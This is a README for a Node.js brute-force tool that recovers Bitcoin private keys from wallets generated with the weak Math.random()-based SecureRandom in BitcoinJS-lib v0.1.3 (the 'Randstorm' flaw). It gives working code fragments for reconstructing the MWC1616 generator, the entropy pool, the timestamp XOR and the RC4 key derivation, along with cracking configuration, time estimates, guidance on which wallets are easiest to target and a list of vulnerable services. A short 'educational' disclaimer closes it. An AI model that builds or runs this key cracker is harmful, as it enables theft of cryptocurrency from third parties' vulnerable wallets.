# RANDSTORM_MWC1616

# Randstorm 2011/2014 - BitcoinJS-lib v0.1.3 Private Key Cracker

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
![Node](https://img.shields.io/badge/node-%3E%3D16.0.0-brightgreen)
![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS%20%7C%20windows-lightgrey)

Between 2010 and 2015, many exchanges and websites relied on **BitcoinJS-lib v0.1.3** for Bitcoin wallet generation. The issue was that many browsers didn't use `window.crypto.random`, which lead to entropy being collected from `Math.random()`.

This tool implements a **multi-threaded, checkpoint-enabled brute-forcer** that exploits this exact vulnerability to recover private keys from wallets generated during that period.

## 🔍 The Vulnerability

In BitcoinJS-lib v0.1.3, the `SecureRandom()` class used a predictable entropy pool:

```javascript
if (this.pool == null) {
    this.poolSize = 256;
    this.pool = new Array(this.poolSize);
    this.pptr = 0;
    var t;

    // Fill the pool with Math.random() values
    while (this.pptr < this.poolSize) {
        t = Math.floor(65536 * Math.random());  // 16-bit value
        this.pool[this.pptr++] = t >>> 8;       // High byte
        this.pool[this.pptr++] = t & 255;       // Low byte
    }

    this.pptr = 0;
    this.seedTime();  // XOR timestamp into the pool
}
The critical flaw: Math.random() in V8 (pre-2015) was a predictable MWC1616 generator. If you know the timestamp (within milliseconds), you can reconstruct the entire pool and the resulting private key.

The Math.random() Predictability
Using tools like v8-randomness-predictor, you can observe the sequence:

text
Sequence = [0.62979695, 0.60744129, 0.99198112, 0.48870040, 0.43987392]
Next: 0.32834963
Updated: [0.60744129, 0.99198112, 0.48870040, 0.43987392, 0.32834963]
Next: 0.37620797
...
⚙️ How It Works
Window Estimation: Using the first transaction date from the blockchain, we search X hours before that timestamp

Step = 1ms: Critical - we test EVERY millisecond to catch the exact generation time

Pool Reconstruction: For each timestamp:

Initialize MWC1616 RNG with timestamp

Fill 256-byte pool with RNG output

XOR timestamp into first 4 bytes (exactly like seedTime())

Run RC4 (Arcfour) to generate 32-byte private key

Check Both Formats: Compressed and uncompressed public keys

Multi-threaded: Uses all CPU cores via Worker Threads

Checkpoint System: Automatic saves every 60 seconds - resume if interrupted

📊 Performance Estimates
With 16 workers on a modern CPU (step=1ms, checking compressed+uncompressed):

Window Size	Timestamps	Est. Time
24 hours	86.4M	1-2 hours
48 hours	172.8M	3-4 hours
72 hours	259.2M	5-6 hours
7 days	604.8M	12-15 hours
Note: Wallet age matters - 2011 wallets had even less entropy and crack faster. 2014+ wallets may need wider windows (72-96h).

🚀 Installation
bash
git clone https://github.com/yourusername/randstorm-2011.git
cd randstorm-2011
npm install secp256k1 bs58@4.0.1
📝 Usage
Basic Usage
bash
node poc.js
Configuration
Edit the CONFIG object at the top of poc.js:

javascript
const CONFIG = {
    HOURS_BEFORE_FIRST_TX: 72,     // Hours to search before first tx
    STEP_MS: 1,                     // 1ms = search EVERY millisecond
    WORKERS: 16,                    // Thread count
    ENABLE_UNCOMPRESSED: true,      // Check both key formats
    CHECKPOINT_INTERVAL: 60000,     // Auto-save every 60s
    CHECKPOINT_DIR: './checkpoints' // Where to save state
};
Getting First Transaction Date
bash
# Convert blockchain date to milliseconds since epoch
date -d "2014-03-16 23:48:51 GMT -7" +"%s" | awk '{print $1 * 1000}'
1395038931000
💾 Checkpoint System
The tool automatically saves progress every 60 seconds to ./checkpoints/.

What's saved:

Last timestamp processed by each worker

Total attempts count

Performance metrics

Resume after interruption:
Simply run the same command again. It will detect the checkpoint and resume exactly where it left off.

text
📦 Checkpoint trovato! Ripresa da: 2024-01-15 14:32:45
📊 Tentativi già effettuati: 45,678,912
🔬 Technical Deep Dive
The MWC1616 Generator
javascript
// Original V8 implementation
state0 = (18030 * (state0 & 0xFFFF) + (state0 >>> 16)) >>> 0;
state1 = (30903 * (state1 & 0xFFFF) + (state1 >>> 16)) >>> 0;
return ((state0 << 16) + (state1 & 0xFFFF)) >>> 0;
Pool Filling (exact replica)
javascript
for (let i = 0; i < 256; i += 2) {
    const rnd = Math.floor(65536 * rng.random());
    pool[i] = (rnd >>> 8) & 0xFF;        // High byte
    pool[i + 1] = rnd & 0xFF;             // Low byte
}
Critical: XOR After Filling
javascript
// This happens AFTER pool is full (seedTime() behavior)
pool[0] ^= ts & 0xFF;
pool[1] ^= (ts >> 8) & 0xFF;
pool[2] ^= (ts >> 16) & 0xFF;
pool[3] ^= (ts >> 24) & 0xFF;
RC4 Initialization
javascript
const rc4 = new RC4_PRNG(pool);
return rc4.getBytes(32);  // 32-byte private key
⚠️ Important Notes
This works BEST for:
✅ Wallets created before March 2012 (minimal entropy)

✅ Wallets where you know first transaction date (±24h)

✅ Addresses with P2PKH format (starting with 1)

This is HARDER for:
❌ Wallets created after 2014 (additional entropy sources)

❌ Addresses with unknown creation window (>7 days)

❌ SegWit addresses (starting with bc1, different format)

📚 Vulnerable Projects
Several historical projects used this vulnerable code:

Coinpunk (used it for years - see coinpunk-0.1.0)

Early versions of Blockchain.info wallets

Various exchanges and faucets 2011-2014

🧪 Testing with Known Data
From the original Randstorm research:

text
Seed: 1393635661000 (March 1, 2014)
Hex: 6ad2d763712eae6428e2922d7181f92fb70d0e564d1dd38dd0aa9b34b844c0cb
P2PKH: 1JbryLqejpB17zLDNspRyJwjL5rjXW7gyw
🛡️ Disclaimer
This software is for educational purposes only.

It should NOT be configured and used to find Bitcoin address hash (RIPEMD-160) collisions and use credit from third-party addresses. This mode might be allowed only to recover lost private keys of your own public addresses.

Another mostly legal use case is a check if a Bitcoin address hash is already in use to prevent yourself from a known hash collision and double use. Some configurations are not allowed in some countries.

🤝 Contributing
This is a work in progress. Replicating the exact SecureRandom() function from Javascript in Node.js has been challenging. If you find issues or improvements:

Fork the repository

Create your feature branch (git checkout -b feature/improvement)

Commit changes (git commit -am 'Add improvement')

Push to branch (git push origin feature/improvement)

Open a Pull Request

📖 Sources
BitcoinJS-lib v0.1.3 source

RandstormBTC original research

V8 randomness predictor

Unciphered Randstorm analysis
